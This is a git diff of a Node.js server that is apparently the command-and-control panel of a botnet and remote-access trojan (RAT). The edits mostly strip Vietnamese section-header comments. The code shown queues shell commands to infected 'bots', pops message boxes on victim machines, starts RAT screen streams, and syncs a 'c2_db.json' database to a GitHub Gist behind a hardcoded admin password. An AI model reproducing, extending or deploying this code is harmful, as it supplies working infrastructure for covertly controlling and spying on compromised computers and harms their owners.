@@ -11,21 +11,13 @@ const sharp = require('sharp');
 const app = express();
 const server = http.createServer(app);
 
-// ============================================================
-//  WEBSOCKET VỚI PATH /ws
-// ============================================================
-const wss = new WebSocket.Server({ 
-    server,
-    path: '/ws'
-});
+const wss = new WebSocket.Server({ server, path: '/ws' });
 
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// ============================================================
-//  GITHUB GIST
-// ============================================================
+// GITHUB GIST
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
 const GIST_ID = process.env.GIST_ID || '';
 const GIST_FILENAME = 'c2_db.json';
@@ -45,9 +37,7 @@ if (GITHUB_TOKEN && GIST_ID) {
     console.log('⚠️ GitHub Gist not configured');
 }
 
-// ============================================================
-//  DATABASE
-// ============================================================
+// DATABASE
 const DB = {
     bots: [],
     commands: [],
@@ -107,9 +97,7 @@ async function saveDB() {
     if (gistEnabled) saveToGist().catch(() => {});
 }
 
-// ============================================================
-//  AUTH
-// ============================================================
+// AUTH
 const ADMIN_PASSWORD = 'H3XTEK0';
 const auth = (req, res, next) => {
     const token = req.headers['authorization'];
@@ -119,9 +107,7 @@ const auth = (req, res, next) => {
     next();
 };
 
-// ============================================================
-//  WEBSOCKET HANDLER
-// ============================================================
+// WEBSOCKET
 const botClients = new Map();
 
 wss.on('connection', (ws, req) => {
@@ -273,10 +259,7 @@ function sendCommand(ws, botId, cmdId, command, args = []) {
     }
 }
 
-// ============================================================
-//  API
-// ============================================================
-
+// API
 app.get('/api/bots', auth, (req, res) => {
     res.json(DB.bots);
 });
@@ -331,9 +314,6 @@ app.post('/api/command', auth, async (req, res) => {
     }
 });
 
-// ============================================================
-//  SHELL API - MỚI
-// ============================================================
 app.post('/api/command/shell', auth, async (req, res) => {
     const { bot_id, command } = req.body;
     if (!bot_id || !command) {
@@ -371,9 +351,6 @@ app.post('/api/command/shell', auth, async (req, res) => {
     }
 });
 
-// ============================================================
-//  MESSAGEBOX API - MỚI
-// ============================================================
 app.post('/api/messagebox', auth, async (req, res) => {
     const { bot_id, title, message, button } = req.body;
     if (!bot_id || !message) {
@@ -414,10 +391,6 @@ app.post('/api/messagebox', auth, async (req, res) => {
         res.json({ status: 'queued', cmd_id: cmdId });
     }
 });
-
-// ============================================================
-//  RAT API
-// ============================================================
 
 app.post('/api/rat/start', auth, (req, res) => {
     const { bot_id } = req.body;
@@ -500,10 +473,7 @@ app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
     res.json({ status: 'stream_started', bot_id: botId });
 });
 
-// ============================================================
-//  RESULTS API
-// ============================================================
-
+// RESULTS
 app.get('/api/results/:cmd_id', auth, (req, res) => {
     const cmdId = req.params.cmd_id;
     console.log(`[API] 🔍 Looking for result: ${cmdId}`);
@@ -589,10 +559,6 @@ app.get('/api/pending', auth, (req, res) => {
     res.json(DB.pending_commands);
 });
 
-// ============================================================
-//  DATABASE MANAGEMENT
-// ============================================================
-
 app.get('/api/db', auth, (req, res) => {
     res.json(DB);
 });
@@ -628,10 +594,6 @@ app.post('/api/gist/sync', auth, async (req, res) => {
     res.json({ status: result ? 'ok' : 'error', message: result ? 'Synced' : 'Sync failed' });
 });
 
-// ============================================================
-//  DASHBOARD
-// ============================================================
-
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
@@ -643,10 +605,6 @@ app.get('/rat', (req, res) => {
 app.get('/style.css', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'style.css'));
 });
-
-// ============================================================
-//  START
-// ============================================================
 
 const PORT = process.env.PORT || 3000;
 
